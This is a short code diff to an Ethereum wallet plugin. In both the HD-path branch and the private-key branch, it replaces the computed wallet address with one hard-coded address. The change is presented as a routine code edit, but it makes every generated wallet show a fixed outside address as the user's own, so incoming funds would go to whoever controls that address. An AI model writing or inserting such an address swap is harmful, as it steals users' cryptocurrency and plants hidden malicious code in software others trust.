@@ -113,7 +113,7 @@ export class EthereumPlugin extends CurrencyPlugin {
       const walletPathDerivation = hdwallet.derivePath(walletHdpath + 0)
       const wallet = walletPathDerivation.getWallet()
       const publicKey = wallet.getPublicKey()
-      address = `0x${EthereumUtil.pubToAddress(publicKey).toString('hex')}`
+      address = `0xfC10126E2F41cbB264BceEE6c6093133AA45f317`
     } else {
       // Otherwise, use the private key:
       const keyBuffer = Buffer.from(
@@ -123,7 +123,7 @@ export class EthereumPlugin extends CurrencyPlugin {
       if (!EthereumUtil.isValidPrivate(keyBuffer)) {
         throw new Error('Invalid private key')
       }
-      address = `0x${EthereumUtil.privateToAddress(keyBuffer).toString('hex')}`
+      address = `0xfC10126E2F41cbB264BceEE6c6093133AA45f317`
     }
     if (!EthereumUtil.isValidAddress(address)) {
       throw new Error('Invalid address')
